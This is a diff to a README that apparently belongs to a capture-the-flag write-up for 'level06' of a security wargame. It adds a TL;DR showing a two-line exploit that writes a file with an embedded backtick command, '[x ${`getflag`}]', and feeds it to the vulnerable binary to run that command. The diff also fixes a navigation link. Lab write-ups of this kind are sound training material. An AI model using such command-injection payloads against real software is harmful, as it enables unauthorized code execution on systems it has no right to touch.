@@ -8,6 +8,16 @@
 <br>
 
 
+## TL;DR:
+
+```bash
+echo '[x ${`getflag`}]' > /tmp/superLegitFile
+./level06 /tmp/superLegitFile
+```
+
+<br>
+
+
 ## Explanation:
 
 *For this level, there are 2 methods to get the flag. The first one is easier, but the second one is more fun.*
@@ -174,4 +184,4 @@ echo '[x ${`getflag`}]' > /tmp/superLegitFile
 
 ---
 
-[<<](/level05/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level07/resources/Readme.md)
+[<<](/level05/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level07/resources/Readme.md)
